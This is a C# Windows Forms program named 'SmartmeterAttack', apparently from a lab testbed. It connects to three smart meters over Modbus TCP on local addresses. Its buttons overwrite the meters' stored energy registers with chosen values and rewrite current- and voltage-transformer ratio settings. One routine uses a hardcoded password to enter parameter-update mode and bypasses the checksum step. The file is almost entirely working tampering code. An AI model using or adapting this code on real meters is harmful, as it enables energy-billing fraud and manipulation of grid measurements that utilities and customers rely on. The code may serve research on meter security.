using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Modbus.Device;
using Modbus.IO;
using Modbus.Data;
using log4net;
using log4net.Config;
using System.IO;
using System.Timers;

namespace SmartmeterAttack
{
    public partial class Form1 : Form
    {
        const int SampleTime1 = 1;
        const int SampleTime2 = 1;
        public TCPSGInterface TcpMeter1;
        public TCPSGInterface TcpMeter2;
        public TCPSGInterface TcpMeter3;
        bool bIsOpen = false;
        public Form1()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (bIsOpen == false)//disconnect--->connect
            {
                try
                {
                    TcpMeter1 = new TCPSGInterface("192.168.1.106");
                    TcpMeter2 = new TCPSGInterface("192.168.1.107");
                    TcpMeter3 = new TCPSGInterface("192.168.1.108");
                    bIsOpen = true;
                    button2.Enabled = true;
                    button3.Enabled = true;
                    button4.Enabled = true;
                    button5.Enabled = true;

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            else
            {//conncet--->disconnect
                try
                {
                    TcpMeter1.close();
                    TcpMeter2.close();
                    bIsOpen = false;
                    button2.Enabled = false;
                    button3.Enabled = false;
                    button4.Enabled = false;
                    button5.Enabled = false;

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }

            button1.Text = bIsOpen ? "断开" : "电表连接";
            
        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {

         
            double E11new =  500000;
            double E12new = 1500000;
            double E21new = 1500000;
            double E22new =  500000;
            
            byte[] bholdregs1 = new byte[8];
            byte[] bholdregs2 = new byte[8];
            byte[] bholdregs3 = new byte[8];
            byte[] bholdregs4 = new byte[8];
            
            
            bholdregs1 = BitConverter.GetBytes(E11new);
            Array.Reverse(bholdregs1, 0, 8);
            bholdregs2 = BitConverter.GetBytes(E12new);
            Array.Reverse(bholdregs2, 0, 8);
            bholdregs3 = BitConverter.GetBytes(E21new);
            Array.Reverse(bholdregs3, 0, 8);
            bholdregs4 = BitConverter.GetBytes(E22new);
            Array.Reverse(bholdregs4, 0, 8);
          
            
            TcpMeter1.WriteMultipleRegisters(801, bholdregs1);
            TcpMeter1.WriteMultipleRegisters(805, bholdregs2);
            TcpMeter2.WriteMultipleRegisters(801, bholdregs3);
            TcpMeter2.WriteMultipleRegisters(805, bholdregs4);
           
        }

        private void button3_Click(object sender, EventArgs e)
        {
            
            //ushort Pass = 5555; CT=25，PT1=220，PT2=220
            ushort CT1_1new = 25;
            UInt32 PT1_1new = 2200;
            ushort PT1_2new = 220;
            ushort CT2_1new = 250;
            UInt32 PT2_1new = 220;
            ushort PT2_2new = 220;
            byte slaveID1 = 7;
            byte slaveID2 = 8;

            byte[] bholdregs1_5 = new byte[4];
            byte[] bholdregs1_6 = new byte[2];
            byte[] bholdregs1_7 = new byte[2];
            byte[] bholdregs1_8 = new byte[4];
            byte[] bholdregs1_9 = new byte[2];
            byte[] bholdregs1_10 = new byte[2];

            bholdregs1_5 = BitConverter.GetBytes(PT1_1new);
            Array.Reverse(bholdregs1_5, 0, 4);
            bholdregs1_6 = BitConverter.GetBytes(CT1_1new);
            Array.Reverse(bholdregs1_6, 0, 2);
            bholdregs1_7 = BitConverter.GetBytes(PT1_2new);
            Array.Reverse(bholdregs1_7, 0, 2);
            bholdregs1_8 = BitConverter.GetBytes(PT2_1new);
            Array.Reverse(bholdregs1_8, 0, 4);
            bholdregs1_9 = BitConverter.GetBytes(CT2_1new);
            Array.Reverse(bholdregs1_9, 0, 2);
            bholdregs1_10 = BitConverter.GetBytes(PT2_2new);
            Array.Reverse(bholdregs1_10, 0, 2);

            TcpMeter3.WriteMultipleRegistersQ(slaveID1, 261, bholdregs1_5);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 264, bholdregs1_6);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 263, bholdregs1_7);
            TcpMeter3.WriteMultipleRegistersQ(slaveID2, 261, bholdregs1_8);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 264, bholdregs1_9);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 263, bholdregs1_10);


        }

        private void button4_Click(object sender, EventArgs e)
        {
            ushort Pass = 5555;
            ushort CT1new = 25;
            ushort PT1new = 240;
            ushort checksum;
            byte slaveID3 = 3;

            byte[] bholdregs11 = new byte[2];


            TcpMeter3.WriteSingleRegisters(slaveID3, 21999, Pass);// in PS update mode
            TcpMeter3.WriteSingleRegisters(slaveID3, 30000, CT1new);
            TcpMeter3.WriteSingleRegisters(slaveID3, 30001, PT1new);
            TcpMeter3.ReadHoldingRegisters(slaveID3, 22001, 1, bholdregs11);
            Array.Reverse(bholdregs11, 0, 2);
            checksum = BitConverter.ToUInt16(bholdregs11, 0);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22002, checksum);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22000, checksum);// out PS update mode

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void button5_Click(object sender, EventArgs e)
        {
            double E11new = 1000000;
            double E12new = 1000000;
            double E21new = 1000000;
            double E22new = 1000000;

            byte[] bholdregs1 = new byte[8];
            byte[] bholdregs2 = new byte[8];
            byte[] bholdregs3 = new byte[8];
            byte[] bholdregs4 = new byte[8];


            bholdregs1 = BitConverter.GetBytes(E11new);
            Array.Reverse(bholdregs1, 0, 8);
            bholdregs2 = BitConverter.GetBytes(E12new);
            Array.Reverse(bholdregs2, 0, 8);
            bholdregs3 = BitConverter.GetBytes(E21new);
            Array.Reverse(bholdregs3, 0, 8);
            bholdregs4 = BitConverter.GetBytes(E22new);
            Array.Reverse(bholdregs4, 0, 8);


            TcpMeter1.WriteMultipleRegisters(801, bholdregs1);
            TcpMeter1.WriteMultipleRegisters(805, bholdregs2);
            TcpMeter2.WriteMultipleRegisters(801, bholdregs3);
            TcpMeter2.WriteMultipleRegisters(805, bholdregs4);

            ushort CT1_1new = 25;
            UInt32 PT1_1new = 220;
            ushort PT1_2new = 220;
            ushort CT2_1new = 25;
            UInt32 PT2_1new = 220;
            ushort PT2_2new = 220;
            byte slaveID1 = 7;
            byte slaveID2 = 8;

            byte[] bholdregs1_5 = new byte[4];
            byte[] bholdregs1_6 = new byte[2];
            byte[] bholdregs1_7 = new byte[2];
            byte[] bholdregs1_8 = new byte[4];
            byte[] bholdregs1_9 = new byte[2];
            byte[] bholdregs1_10 = new byte[2];

            bholdregs1_5 = BitConverter.GetBytes(PT1_1new);
            Array.Reverse(bholdregs1_5, 0, 4);
            bholdregs1_6 = BitConverter.GetBytes(CT1_1new);
            Array.Reverse(bholdregs1_6, 0, 2);
            bholdregs1_7 = BitConverter.GetBytes(PT1_2new);
            Array.Reverse(bholdregs1_7, 0, 2);
            bholdregs1_8 = BitConverter.GetBytes(PT2_1new);
            Array.Reverse(bholdregs1_8, 0, 4);
            bholdregs1_9 = BitConverter.GetBytes(CT2_1new);
            Array.Reverse(bholdregs1_9, 0, 2);
            bholdregs1_10 = BitConverter.GetBytes(PT2_2new);
            Array.Reverse(bholdregs1_10, 0, 2);

            TcpMeter3.WriteMultipleRegistersQ(slaveID1, 261, bholdregs1_5);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 264, bholdregs1_6);
            TcpMeter3.WriteMultipleRegistersP(slaveID1, 263, bholdregs1_7);
            TcpMeter3.WriteMultipleRegistersQ(slaveID2, 261, bholdregs1_8);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 264, bholdregs1_9);
            TcpMeter3.WriteMultipleRegistersP(slaveID2, 263, bholdregs1_10);

            ushort Pass = 5555;
            ushort CT1new = 25;
            ushort PT1new = 120;
            ushort checksum;
            byte slaveID3 = 3;

            byte[] bholdregs11 = new byte[2];


            TcpMeter3.WriteSingleRegisters(slaveID3, 21999, Pass);// in PS update mode
            TcpMeter3.WriteSingleRegisters(slaveID3, 30000, CT1new);
            TcpMeter3.WriteSingleRegisters(slaveID3, 30001, PT1new);
            TcpMeter3.ReadHoldingRegisters(slaveID3, 22001, 1, bholdregs11);
            Array.Reverse(bholdregs11, 0, 2);
            checksum = BitConverter.ToUInt16(bholdregs11, 0);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22002, checksum);
            TcpMeter3.WriteSingleRegisters(slaveID3, 22000, checksum);// out PS update mode
        }
    }
}
